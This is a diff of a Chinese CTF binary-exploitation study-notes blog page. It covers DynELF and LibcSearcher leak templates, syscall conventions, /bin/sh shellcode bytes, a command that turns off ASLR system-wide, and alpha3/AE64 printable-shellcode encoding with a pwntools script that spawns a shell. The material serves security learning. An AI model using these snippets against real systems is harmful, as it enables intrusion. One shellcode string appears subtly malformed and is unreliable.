@@ -88,7 +88,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/images/1d32aeb24f50118ff3b8cc213973f793.jpg">
 <meta property="article:published_time" content="2021-03-04T02:02:00.000Z">
-<meta property="article:modified_time" content="2021-07-19T00:48:50.621Z">
+<meta property="article:modified_time" content="2021-07-22T01:33:07.105Z">
 <meta property="article:author" content="Archer">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/1d32aeb24f50118ff3b8cc213973f793.jpg">
@@ -135,7 +135,7 @@
 
 
 
-<meta name="generator" content="Hexo 5.4.0"></head>
+</head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
 
@@ -343,8 +343,7 @@
 <p>Dynelf模板：<br>p = remote(ip, port)<br>def leak(addr):<br>       payload2leak_addr = “<strong><strong>” + pack(addr) + “</strong></strong>”<br>       p.send(payload2leak_addr)<br>       data = p.recv(4)<br>       return data<br>d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)<br>system_addr = d.lookup(‘system’, ‘libc’)<br>read_add = d.lookup(‘read’,’libc’)</p>
 <p>在 ELF 内存映射时，bss 段会被映射两次，例如bss:600D21 aCtfHereSTheFla db ‘CTF{Here’,27h,’s the flag on server}’,0 可以看到0x600D21即为flag的地址，但是这里的flag后面会被程序覆盖 此时只能另一个地址来得到flag<br>gdb命令：vmmap smashes查看程序映射的情况</p>
 <p>64位需要考虑堆栈平衡<br>关于函数指针的介绍<a target="_blank" rel="noopener" href="http://c.biancheng.net/view/228.html">http://c.biancheng.net/view/228.html</a><br>函数的调用：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/clover-toeic/p/3755401.html%E8%BF%99%E7%AF%87blog%E8%AE%B2%E7%9A%84%E9%9D%9E%E5%B8%B8%E5%A5%BD">https://www.cnblogs.com/clover-toeic/p/3755401.html这篇blog讲的非常好</a></p>
-<p>shellcode编写：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35495684/article/details/79583232">https://blog.csdn.net/qq_35495684/article/details/79583232</a><br>“\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x00\x68\x2f\x62\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80”(25)<br>“\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80”(23)</p>
-<p>当使用git clone 下载时速度慢的解决方法：使用github的镜像网站进行访问，github.com.cnpmjs.org，我们将原本的网站中的github.com 进行替换。</p>
+<p>shellcode编写：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35495684/article/details/79583232">https://blog.csdn.net/qq_35495684/article/details/79583232</a><br>“\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x00\x68\x2f\x62\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80”(25)<br>“\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80”(23)<br>shellcode对应字节码，有时需要使用别的有效的字节码绕过：见buupwn中102.starctf_2019_babyshell<br>当使用git clone 下载时速度慢的解决方法：使用github的镜像网站进行访问，github.com.cnpmjs.org，我们将原本的网站中的github.com 进行替换。</p>
 <p>小端与大端:<br>小端:<br>      0x00 78<br>      0x01 56<br>      0x02 34<br>      0x03 12<br>大端与小端相反</p>
 <p>ldd pwnme,查看libc文件的加载位置是否会变<br>echo 0 &gt; /proc/sys/kernel/randomize_va_space,关闭整个系统的地址随机化保护。<br>layout asm打开汇编调试窗口</p>
 <p>获得bss_addr<br>      elf=ELF(‘./level3’) bss_addr=elf.bss()(无libc文件)<br>      strings -a -t x libc_32.so.6 | grep “/bin/sh”</p>
@@ -360,9 +359,9 @@
 <p>学到一个小知识点，原来system中的参数为sh也能拿到权限，不一定非要/bin/sh<br>学到一个小技巧，在程序开启pie时，不太方便查看内存，可以通过输入字符串，然后通过在gdb中通过find命令，查找该字符串</p>
 <p>LibcSearcher的使用：<br>from LibcSearcher import *<br>libc = LibcSearcher(“write”,write_addr)<br>libcbase = write_addr - libc.dump(‘write’)<br>system = libcbase + libc.dump(‘system’)<br>binsh = libcbase + libc.dump(‘str_bin_sh’)</p>
 <p>libc在线网站：<a target="_blank" rel="noopener" href="https://libc.blukat.me/">https://libc.blukat.me/</a></p>
-<p>32位系统调用与64位系统调用<br>32位：</p>
+<p>32位系统调用与64位系统调用执行system<br>32位：</p>
 <p>　　传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器</p>
-<p>　　调用号：sys_read 的调用号 为 3 sys_write 的调用号 为 4</p>
+<p>　　调用号：sys_read 的调用号 为 3 sys_write 的调用号 为 4  system 11</p>
 <p>　　调用方式: 使用 int 80h 中断进行系统调用</p>
 <p>64位：</p>
 <p>　　传参方式：首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器</p>
@@ -383,6 +382,16 @@
 <p>dup2 用来复制文件描述符：int dup2 (int oldfd,int newfd)<br>_ fileno 是用来规定 fd 所指向的文件流的，dup2(fd,666)将flag的fd改成了666，所以我们只要想办法把 stdin 的 _ fileno 改成 666 即可，这样在之后 scanf 就会将 fd == 666 （flag）的内容输入到 &amp; v0 中，然后我们就可以输出 flag 的内容了</p>
 <p>argc：命令的条数<br>argv[]：输入的每条命令<br>argv[0]为程序的名称</p>
 <p>去除程序的alarm函数，以及alarm在某些题目中的作用<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/111214951">https://blog.csdn.net/A951860555/article/details/111214951</a></p>
+<p>无符号数和有符号数比较会转化为无符号数的比较，而-1能表示成很大的无符号数，有时能够通过<br>-1构造溢出</p>
+<p>工具:算小数的16进制等:<br><a target="_blank" rel="noopener" href="http://www.binaryconvert.com/result_double.html?decimal=048046049">http://www.binaryconvert.com/result_double.html?decimal=048046049</a></p>
+<p>signed int 的范围：[-2147483648,2147483647]</p>
+<p>signal相关知识<br>signal函数原型void（* signal（int sig，void（* func）（int）））（int）;<br>sig为对应的信号，func函数则表示，当遇到sig的信号时，执行func函数</p>
+<p>alpha3的使用：<br>作用：可打印shellcode<br>安装：git clone <a target="_blank" rel="noopener" href="https://github.com/TaQini/alpha3.git">https://github.com/TaQini/alpha3.git</a><br>python ./ALPHA3.py x64 ascii mixedcase rax –input=”shellcode”<br>x64对应系统，rax对应取决于跳到shellcode的方式，比如rax</p>
+<p>x86中：<br>x86 ascii uppercase (数字+大写字母)<br>x86 ascii lowercase (数字+小写字母)<br>x86 ascii mixedcase (数字+大小写字母)</p>
+<p>AE64的使用：<br>作用：64位的alphga shellcode，更加灵活的使用寄存器<br>安装：git clone <a target="_blank" rel="noopener" href="https://github.com/veritas501/ae64.git">https://github.com/veritas501/ae64.git</a><br>例子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./example1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">obj = AE64()</span><br><span class="line">sc = obj.encode(asm(shellcraft.sh()),<span class="string">&#x27;r13&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(sc)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>关于拟态，在pwn中拟态表示的是通过fork，同时开启32位以及64位的程序，监测输入，而要拿到权限<br>需要保证在32位和64位中都能拿到权限，并且输出也一样，例题buu 强网杯2019 拟态 STKOF</p>
 
       
     </div>
